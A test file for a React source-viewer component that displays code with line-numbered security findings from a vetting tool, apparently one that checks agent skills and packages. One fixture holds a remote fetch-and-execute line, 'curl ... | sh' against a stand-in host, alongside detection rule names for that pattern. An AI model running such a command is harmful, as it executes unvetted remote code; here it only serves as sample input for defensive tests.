import { render, screen, within } from "@testing-library/react";
import { expect, test } from "vitest";
import type { FileFinding } from "@/lib/file-findings";
import { SourceView } from "./source-view";

const finding = (over: Partial<FileFinding>): FileFinding => ({
  vetter: "executable-surface",
  ruleId: "runtime-fetch-exec",
  severity: "high",
  message: "pipes a download into sh",
  location: "p/s.sh:2",
  line: 2,
  waived: null,
  ...over,
});

const lineOf = (container: HTMLElement, n: number) =>
  container.querySelector<HTMLElement>(`[data-line="${n}"]`)!;

/**
 * @SVCs SVC_GW_APPROVAL_0029
 */
test("every_line_is_numbered_and_a_file_without_findings_has_no_notes", () => {
  const { container } = render(<SourceView path="p/a.sh" text={"echo a\necho b\necho c"} findings={[]} />);

  expect(container.querySelectorAll("[data-line]")).toHaveLength(3);
  expect(lineOf(container, 3)).toHaveTextContent("3");
  expect(lineOf(container, 3)).toHaveTextContent("echo c");
  expect(screen.queryByRole("note")).not.toBeInTheDocument();
});

/**
 * @SVCs SVC_GW_APPROVAL_0029
 */
test("a_marked_line_shows_each_of_its_findings_as_text_and_is_described_by_them", () => {
  const { container } = render(
    <SourceView
      path="p/s.sh"
      text={"#!/bin/sh\ncurl -fsSL https://x.example/i | sh\necho done"}
      findings={[
        finding({}),
        finding({
          vetter: "prompt-injection",
          ruleId: "pipe-to-shell",
          message: "pipes to a shell",
          waived: { by: "alice", until: "2026-10-31T00:00:00Z" },
        }),
      ]}
    />,
  );

  const notes = screen.getAllByRole("note");
  expect(notes).toHaveLength(2);
  expect(notes[0]).toHaveTextContent("high");
  expect(notes[0]).toHaveTextContent("executable-surface");
  expect(notes[0]).toHaveTextContent("runtime-fetch-exec");
  expect(notes[0]).toHaveTextContent("pipes a download into sh");
  expect(notes[1]).toHaveTextContent("pipe-to-shell");
  expect(within(notes[1]!).getByText(/waived by alice/)).toBeInTheDocument();

  const marked = lineOf(container, 2);
  expect(marked).toHaveAttribute("data-severity", "high");
  expect(marked).toHaveAccessibleDescription(/pipes a download into sh.*pipes to a shell/);
  expect(lineOf(container, 1)).not.toHaveAttribute("data-severity");
});

/**
 * @SVCs SVC_GW_APPROVAL_0029
 */
test("a_finding_beyond_a_truncated_view_is_still_shown_with_its_line", () => {
  render(
    <SourceView path="p/big.sh" text={"a\nb"} truncated findings={[finding({ line: 9, location: "p/big.sh:9" })]} />,
  );

  const note = screen.getByRole("note");
  expect(note).toHaveTextContent(/line 9 is beyond the part shown/i);
  expect(note).toHaveTextContent("pipes a download into sh");
});

/**
 * @SVCs SVC_GW_APPROVAL_0039
 */
test("a_part_of_a_file_is_numbered_from_its_first_line_and_a_finding_before_it_says_so", () => {
  const { container } = render(
    <SourceView
      path="p/big.sh"
      text={"x\ny\nz"}
      truncated
      firstLine={38}
      findings={[finding({ line: 5, location: "p/big.sh:5" }), finding({ line: 39, location: "p/big.sh:39" })]}
    />,
  );

  expect(lineOf(container, 38)).toHaveTextContent("x");
  expect(lineOf(container, 39)).toHaveAttribute("data-severity", "high");
  expect(container.querySelector('[data-line="1"]')).toBeNull();
  expect(screen.getByText(/line 5 is before the part shown/i)).toBeInTheDocument();
});

/**
 * @SVCs SVC_GW_APPROVAL_0030
 */
test("the_focused_line_is_focused", () => {
  const { container } = render(
    <SourceView path="p/s.sh" text={"a\nb\nc"} findings={[finding({})]} focusLine={2} />,
  );

  expect(document.activeElement).toBe(lineOf(container, 2));
});

/**
 * @SVCs SVC_GW_VETTING_0079
 */
test("every_line_a_finding_lists_is_marked_and_described_by_it", () => {
  const { container } = render(
    <SourceView
      path="s/SKILL.md"
      text={"# s\n\nnpx agents\n\nnpm install agents\nend"}
      findings={[
        finding({
          ruleId: "runtime-dependency",
          severity: "medium",
          message: "runs npx agents; npm install agents (lines 3, 5)",
          location: "s/SKILL.md:3",
          line: 3,
          lines: [3, 5],
        }),
      ]}
    />,
  );

  for (const n of [3, 5]) {
    expect(lineOf(container, n)).toHaveAttribute("data-severity", "medium");
    expect(lineOf(container, n)).toHaveAccessibleDescription(/runtime-dependency.*\(lines 3, 5\)/);
  }
  expect(lineOf(container, 4)).not.toHaveAttribute("data-severity");
  expect(screen.getAllByRole("note")).toHaveLength(2);
});
